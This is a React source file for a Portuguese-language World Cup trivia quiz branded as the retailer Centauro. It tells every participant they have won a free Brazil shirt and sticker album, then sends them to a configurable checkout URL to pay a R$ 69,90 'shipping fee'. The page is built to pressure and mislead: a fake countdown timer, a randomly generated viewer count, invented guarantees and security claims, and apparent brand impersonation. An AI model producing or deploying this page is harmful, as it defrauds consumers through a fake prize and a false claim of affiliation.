import { useState, useEffect } from 'react';
import { Button } from '@/components/ui/button';
import { Card } from '@/components/ui/card';
import CentauroHeader from '@/components/CentauroHeader';
import LoadingAnimation from '@/components/LoadingAnimation';
import { CheckCircle, Trophy, Truck, Shield, Clock, Users, Star, Gift } from 'lucide-react';
import camisaImg from '@/assets/camisa-brasil-hero.png';
import albumImg from '@/assets/album-copa-hero.png';

interface Question {
  id: number;
  question: string;
  options: string[];
  correctAnswer: number;
}

const quizQuestions: Question[] = [
  {
    id: 1,
    question: 'Quantas vezes o Brasil ganhou a Copa do Mundo?',
    options: ['3 vezes', '4 vezes', '5 vezes', '6 vezes'],
    correctAnswer: 2,
  },
  {
    id: 2,
    question: 'Em que ano o Brasil venceu sua primeira Copa do Mundo?',
    options: ['1950', '1958', '1962', '1970'],
    correctAnswer: 1,
  },
  {
    id: 3,
    question: 'Qual jogador é o maior artilheiro da Seleção em Copas?',
    options: ['Ronaldo', 'Pelé', 'Ronaldinho', 'Neymar'],
    correctAnswer: 0,
  },
  {
    id: 4,
    question: 'Neymar joga com qual número na Seleção?',
    options: ['7', '10', '11', '9'],
    correctAnswer: 1,
  },
  {
    id: 5,
    question: 'Quantos gols Pelé marcou pela Seleção Brasileira?',
    options: ['70 gols', '77 gols', '85 gols', '90 gols'],
    correctAnswer: 1,
  },
  {
    id: 6,
    question: 'Qual seleção é a maior rival do Brasil em Copas?',
    options: ['Itália', 'Alemanha', 'Argentina', 'França'],
    correctAnswer: 2,
  },
  {
    id: 7,
    question: 'Qual país sediará a Copa do Mundo 2026?',
    options: ['Brasil', 'Argentina', 'EUA, México e Canadá', 'Austrália'],
    correctAnswer: 2,
  },
  {
    id: 8,
    question: 'Quantas Copas do Mundo Ronaldo Fenômeno disputou?',
    options: ['2 Copas', '3 Copas', '4 Copas', '5 Copas'],
    correctAnswer: 2,
  },
];

export default function QuizHome() {
  const [currentQuestion, setCurrentQuestion] = useState(0);
  const [showResult, setShowResult] = useState(false);
  const [quizComplete, setQuizComplete] = useState(false);
  const [selectedAnswer, setSelectedAnswer] = useState<number | null>(null);
  const [isCorrect, setIsCorrect] = useState(false);
  const [showAnimation, setShowAnimation] = useState(false);
  const [timeLeft, setTimeLeft] = useState(3600);
  const [viewersCount] = useState(Math.floor(Math.random() * 30) + 38);

  useEffect(() => {
    const timer = setInterval(() => {
      setTimeLeft(prev => (prev > 0 ? prev - 1 : 0));
    }, 1000);
    return () => clearInterval(timer);
  }, []);

  const formatTime = (seconds: number) => {
    const h = Math.floor(seconds / 3600);
    const m = Math.floor((seconds % 3600) / 60);
    const s = seconds % 60;
    return `${h.toString().padStart(2, '0')}:${m.toString().padStart(2, '0')}:${s.toString().padStart(2, '0')}`;
  };

  const handleAnswerClick = (index: number) => {
    if (selectedAnswer !== null) return;
    setSelectedAnswer(index);
    setShowResult(true);
    setIsCorrect(index === quizQuestions[currentQuestion].correctAnswer);
  };

  const handleNextQuestion = () => {
    if (currentQuestion < quizQuestions.length - 1) {
      setCurrentQuestion(prev => prev + 1);
      setSelectedAnswer(null);
      setShowResult(false);
      setIsCorrect(false);
    } else {
      setShowAnimation(true);
    }
  };

  const handleGoToCheckout = () => {
    const checkoutUrl = localStorage.getItem('checkoutUrl') || 'https://seu-checkout.com/taxa-envio';
    window.location.href = checkoutUrl;
  };

  if (showAnimation) {
    return <LoadingAnimation onComplete={() => { setShowAnimation(false); setQuizComplete(true); }} />;
  }

  if (quizComplete) {
    return (
      <div className="min-h-screen bg-secondary">
        <CentauroHeader />

        {/* Urgency Bar */}
        <div className="bg-accent text-accent-foreground py-3">
          <div className="max-w-4xl mx-auto px-4 flex items-center justify-center gap-6 text-sm font-bold">
            <div className="flex items-center gap-2">
              <Clock size={16} className="text-primary" />
              <span>Oferta expira em: </span>
              <span className="text-primary animate-countdown">{formatTime(timeLeft)}</span>
            </div>
            <div className="hidden md:flex items-center gap-2">
              <Users size={16} className="text-centauro-gold" />
              <span>{viewersCount} pessoas vendo agora</span>
            </div>
          </div>
        </div>

        {/* Victory Section */}
        <div className="bg-primary py-16 text-center relative overflow-hidden">
          <div className="absolute inset-0 opacity-10">
            {[...Array(6)].map((_, i) => (
              <Star key={i} className="absolute text-primary-foreground" size={40} style={{
                top: `${Math.random() * 100}%`,
                left: `${Math.random() * 100}%`,
                transform: `rotate(${Math.random() * 360}deg)`,
              }} />
            ))}
          </div>
          <Trophy className="w-20 h-20 text-centauro-gold mx-auto mb-4" />
          <h1 className="text-5xl md:text-6xl font-black text-primary-foreground mb-3 tracking-tight">
            PARABÉNS!
          </h1>
          <p className="text-xl font-bold text-primary-foreground/90">
            Você ganhou seus prêmios exclusivos Centauro!
          </p>
        </div>

        {/* Products */}
        <div className="max-w-4xl mx-auto px-4 py-12">
          <h2 className="text-3xl font-black text-foreground mb-8 text-center tracking-tight">
            SEUS PRÊMIOS
          </h2>

          <div className="grid grid-cols-1 md:grid-cols-2 gap-6 mb-12">
            <Card className="overflow-hidden border-2 border-border hover:border-primary transition-colors">
              <div className="bg-secondary p-8 flex items-center justify-center min-h-[250px]">
                <img src={camisaImg} alt="Camisa Brasil 2026" className="max-h-52 object-contain" />
              </div>
              <div className="p-6">
                <div className="flex items-center gap-2 mb-2">
                  <span className="bg-primary text-primary-foreground text-xs font-bold px-2 py-1 rounded">EXCLUSIVO</span>
                </div>
                <h3 className="text-xl font-black text-foreground mb-1">Camisa Brasil 2026</h3>
                <p className="text-muted-foreground text-sm mb-4">Seleção Brasileira - Edição Copa</p>
                <ul className="space-y-2 text-sm">
                  <li className="flex items-center gap-2 text-foreground">
                    <CheckCircle size={14} className="text-centauro-green" /> Qualidade Premium
                  </li>
                  <li className="flex items-center gap-2 text-foreground">
                    <CheckCircle size={14} className="text-centauro-green" /> Bordado Oficial CBF
                  </li>
                  <li className="flex items-center gap-2 text-foreground">
                    <CheckCircle size={14} className="text-centauro-green" /> Todos os tamanhos
                  </li>
                </ul>
                <div className="mt-4 flex items-center gap-2">
                  <span className="text-muted-foreground line-through text-sm">R$ 249,90</span>
                  <span className="text-centauro-green font-black text-lg">GRÁTIS</span>
                </div>
              </div>
            </Card>

            <Card className="overflow-hidden border-2 border-border hover:border-primary transition-colors">
              <div className="bg-secondary p-8 flex items-center justify-center min-h-[250px]">
                <img src={albumImg} alt="Álbum Copa 2026" className="max-h-52 object-contain" />
              </div>
              <div className="p-6">
                <div className="flex items-center gap-2 mb-2">
                  <span className="bg-primary text-primary-foreground text-xs font-bold px-2 py-1 rounded">EXCLUSIVO</span>
                </div>
                <h3 className="text-xl font-black text-foreground mb-1">Álbum Copa 2026</h3>
                <p className="text-muted-foreground text-sm mb-4">Panini + 50 Pacotes de Figurinhas</p>
                <ul className="space-y-2 text-sm">
                  <li className="flex items-center gap-2 text-foreground">
                    <CheckCircle size={14} className="text-centauro-green" /> 140+ packs de figurinhas
                  </li>
                  <li className="flex items-center gap-2 text-foreground">
                    <CheckCircle size={14} className="text-centauro-green" /> Edição Limitada FIFA
                  </li>
                  <li className="flex items-center gap-2 text-foreground">
                    <CheckCircle size={14} className="text-centauro-green" /> Figurinhas Exclusivas
                  </li>
                </ul>
                <div className="mt-4 flex items-center gap-2">
                  <span className="text-muted-foreground line-through text-sm">R$ 189,90</span>
                  <span className="text-centauro-green font-black text-lg">GRÁTIS</span>
                </div>
              </div>
            </Card>
          </div>

          {/* Order Summary */}
          <Card className="p-8 mb-8 border-2 border-border">
            <h3 className="text-2xl font-black text-foreground mb-6 text-center tracking-tight">
              RESUMO DO PEDIDO
            </h3>
            <div className="space-y-3 mb-6">
              <div className="flex items-center justify-between p-4 bg-secondary rounded-lg">
                <div>
                  <p className="font-bold text-foreground">Camisa Oficial Brasil 2026</p>
                  <p className="text-sm text-muted-foreground">Valor: R$ 249,90</p>
                </div>
                <p className="font-black text-centauro-green">GRÁTIS</p>
              </div>
              <div className="flex items-center justify-between p-4 bg-secondary rounded-lg">
                <div>
                  <p className="font-bold text-foreground">Álbum Copa 2026 + 50 Packs</p>
                  <p className="text-sm text-muted-foreground">Valor: R$ 189,90</p>
                </div>
                <p className="font-black text-centauro-green">GRÁTIS</p>
              </div>
              <div className="border-t border-border my-4" />
              <div className="flex items-center justify-between p-4 bg-primary/5 rounded-lg border border-primary/20">
                <div>
                  <p className="font-bold text-foreground">Taxa de Envio</p>
                  <p className="text-sm text-muted-foreground">Entrega em 7-10 dias úteis</p>
                </div>
                <p className="font-black text-primary text-lg">R$ 69,90</p>
              </div>
            </div>
            <div className="bg-secondary p-6 rounded-lg text-center">
              <p className="text-muted-foreground text-sm font-medium mb-1">Total de Prêmios</p>
              <p className="text-4xl font-black text-foreground mb-1">R$ 439,80</p>
              <p className="text-lg font-bold text-centauro-green">Você economiza R$ 370,00!</p>
            </div>
          </Card>

          {/* CTA */}
          <div className="bg-accent rounded-2xl p-8 md:p-12 text-center mb-8">
            <Gift className="w-12 h-12 text-primary mx-auto mb-4" />
            <p className="text-accent-foreground/70 text-sm font-bold tracking-widest uppercase mb-3">
              Próximo Passo
            </p>
            <h3 className="text-3xl md:text-4xl font-black text-accent-foreground mb-2">
              PAGUE APENAS O FRETE
            </h3>
            <div className="bg-primary rounded-xl p-6 my-6 max-w-sm mx-auto">
              <p className="text-primary-foreground text-xs font-bold mb-1 opacity-80">VALOR DO FRETE</p>
              <p className="text-primary-foreground text-5xl font-black">R$ 69,90</p>
              <p className="text-primary-foreground text-xs font-bold mt-1 opacity-80">Entrega em 7-10 dias úteis</p>
            </div>
            <Button
              onClick={handleGoToCheckout}
              className="w-full max-w-md bg-centauro-green hover:bg-centauro-green/90 text-primary-foreground font-black text-lg py-6 rounded-xl animate-pulse-glow transition-transform hover:scale-105 active:scale-95"
              style={{ boxShadow: '0 8px 25px hsl(142 72% 42% / 0.4)' }}
            >
              🏆 GARANTIR MEUS PRÊMIOS AGORA
            </Button>
            <p className="text-accent-foreground/60 text-sm font-bold mt-4">
              Oferta válida por {formatTime(timeLeft)}
            </p>
          </div>

          {/* Trust badges */}
          <div className="grid grid-cols-3 gap-4 mb-8">
            <div className="bg-card p-4 rounded-lg border border-border text-center">
              <CheckCircle className="text-centauro-green mx-auto mb-2" size={24} />
              <h4 className="font-bold text-foreground text-sm">Garantido</h4>
              <p className="text-xs text-muted-foreground">Todos ganham</p>
            </div>
            <div className="bg-card p-4 rounded-lg border border-border text-center">
              <Truck className="text-primary mx-auto mb-2" size={24} />
              <h4 className="font-bold text-foreground text-sm">Entrega Rápida</h4>
              <p className="text-xs text-muted-foreground">7-10 dias úteis</p>
            </div>
            <div className="bg-card p-4 rounded-lg border border-border text-center">
              <Shield className="text-foreground mx-auto mb-2" size={24} />
              <h4 className="font-bold text-foreground text-sm">100% Seguro</h4>
              <p className="text-xs text-muted-foreground">Compra protegida</p>
            </div>
          </div>

          {/* FAQ */}
          <Card className="p-6 md:p-8 border-2 border-border">
            <h3 className="text-xl font-black text-foreground mb-6 text-center">
              PERGUNTAS FREQUENTES
            </h3>
            <div className="space-y-3">
              {[
                { q: 'Como funciona a entrega?', a: 'Após confirmar o pedido, você receberá um email com o rastreamento. Entrega em 7-10 dias úteis.' },
                { q: 'Posso devolver?', a: 'Sim! Garantia de 30 dias. Se não gostar, devolvemos seu dinheiro.' },
                { q: 'Meus dados estão seguros?', a: '100% seguro! SSL 256-bit. Nunca compartilhamos seus dados.' },
                { q: 'Como entro em contato?', a: 'Suporte 24/7 via WhatsApp, Email e Chat.' },
              ].map((faq, i) => (
                <div key={i} className="bg-secondary p-4 rounded-lg">
                  <p className="font-bold text-foreground text-sm mb-1">{faq.q}</p>
                  <p className="text-xs text-muted-foreground">{faq.a}</p>
                </div>
              ))}
            </div>
          </Card>

          {/* Footer */}
          <div className="text-center py-8 text-muted-foreground text-xs">
            <p>© 2026 Centauro Esportes. Todos os direitos reservados.</p>
            <p className="mt-1">Promoção válida enquanto durar o estoque.</p>
          </div>
        </div>
      </div>
    );
  }

  // Quiz screen
  const question = quizQuestions[currentQuestion];
  const progressPercent = ((currentQuestion + 1) / quizQuestions.length) * 100;

  return (
    <div className="min-h-screen bg-secondary">
      <CentauroHeader />

      <div className="max-w-2xl mx-auto px-4 py-8">
        {/* Progress */}
        <div className="mb-8">
          <div className="flex justify-between items-center mb-2">
            <span className="text-sm font-bold text-muted-foreground">
              Pergunta {currentQuestion + 1} de {quizQuestions.length}
            </span>
            <span className="text-sm font-bold text-primary">
              {Math.round(progressPercent)}%
            </span>
          </div>
          <div className="w-full bg-border rounded-full h-2.5 overflow-hidden">
            <div
              className="h-full bg-primary rounded-full transition-all duration-500"
              style={{ width: `${progressPercent}%` }}
            />
          </div>
        </div>

        {/* Question Card */}
        <Card className="p-6 md:p-8 border-2 border-border mb-6">
          <h2 className="text-2xl md:text-3xl font-black text-foreground mb-8 leading-tight">
            {question.question}
          </h2>
          <div className="space-y-3">
            {question.options.map((option, index) => {
              const isSelected = selectedAnswer === index;
              const isCorrectAnswer = index === question.correctAnswer;
              let btnClass = 'w-full p-4 text-left font-bold rounded-lg transition-all duration-300 border-2 ';

              if (selectedAnswer === null) {
                btnClass += 'bg-card border-border hover:border-primary hover:bg-primary/5 cursor-pointer';
              } else if (isSelected) {
                btnClass += isCorrect
                  ? 'bg-centauro-green/10 border-centauro-green text-centauro-green'
                  : 'bg-destructive/10 border-destructive text-destructive';
              } else if (isCorrectAnswer) {
                btnClass += 'bg-centauro-green/10 border-centauro-green text-centauro-green';
              } else {
                btnClass += 'bg-secondary border-border text-muted-foreground';
              }

              return (
                <button
                  key={index}
                  onClick={() => handleAnswerClick(index)}
                  disabled={selectedAnswer !== null}
                  className={btnClass}
                >
                  <span className="flex items-center">
                    <span className="inline-flex items-center justify-center w-8 h-8 rounded-full bg-primary text-primary-foreground font-black mr-3 text-sm">
                      {String.fromCharCode(65 + index)}
                    </span>
                    {option}
                  </span>
                </button>
              );
            })}
          </div>
        </Card>

        {/* Feedback */}
        {showResult && (
          <div className={`p-4 rounded-lg text-center font-bold mb-6 border-2 ${
            isCorrect
              ? 'bg-centauro-green/10 border-centauro-green text-centauro-green'
              : 'bg-destructive/10 border-destructive text-destructive'
          }`}>
            {isCorrect ? '✓ Correto! Muito bem!' : '✗ Não foi dessa vez!'}
          </div>
        )}

        {/* Next Button */}
        {showResult && (
          <div className="flex justify-center">
            <Button
              onClick={handleNextQuestion}
              className="bg-primary hover:bg-primary/90 text-primary-foreground font-black text-lg px-10 py-5 rounded-lg transition-transform hover:scale-105"
            >
              {currentQuestion === quizQuestions.length - 1 ? '🏆 VER MEUS PRÊMIOS' : 'PRÓXIMA →'}
            </Button>
          </div>
        )}

        {/* Prize preview */}
        <div className="mt-8 bg-accent/50 rounded-lg p-4 border border-border">
          <div className="flex items-center gap-3 justify-center">
            <Gift size={18} className="text-primary" />
            <p className="text-sm font-bold text-foreground">
              Prêmio: <span className="text-primary">Camisa Brasil + Álbum Copa 2026</span>
            </p>
          </div>
        </div>
      </div>
    </div>
  );
}
